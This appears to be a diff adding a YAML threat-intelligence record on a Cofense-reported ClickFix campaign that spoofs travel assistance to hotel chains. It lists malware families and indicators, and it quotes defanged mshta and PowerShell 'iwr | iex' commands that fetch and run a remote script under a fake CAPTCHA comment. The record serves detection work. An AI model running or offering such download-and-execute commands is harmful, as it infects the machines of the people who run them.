@@ -1,0 +1,35 @@
+description: Cofense Intelligence tracks travel assistance-themed emails targeting
+  hotel chains with fake CAPTCHA sites delivering malicious scripts via ClickFix attacks.
+attribution:
+- threat actor: Unknown
+malware_families:
+- XWorm RAT
+- Pure Logs Stealer
+- DanaBot
+- ConnectWise RAT
+TTPs:
+  processes:
+  - mshta.exe
+  commandline:
+  - mshta.exe hxxps[://]lanurbeauty[.]com/wp-includes/norob[.]txt
+  powershell:
+  - 'powershell -w 1 iwr hxxps[://]lanurbeauty[.]com/wp-includes/norob[.]txt |iex
+    # I confirm that I am human reCAPTCHA ID 15891'
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: mshta.exe
+    destination: hxxps://lanurbeauty[.]com/wp-includes/norob[.]txt
+    port: 443
+  file_activity: []
+  persistence: []
+  pipes: []
+  process_relations: []
+IOCs:
+- URL: hxxps://lanurbeauty[.]com/wp-includes/norob[.]txt
+authors:
+- Kahng An, Intelligence Team
+reference: https://cofense.com/blog/clickfix-campaign-spoofs-booking-com-for-malware-delivery
+date_of_publication: June 04, 2025
+file_creation_date: July 28, 2025
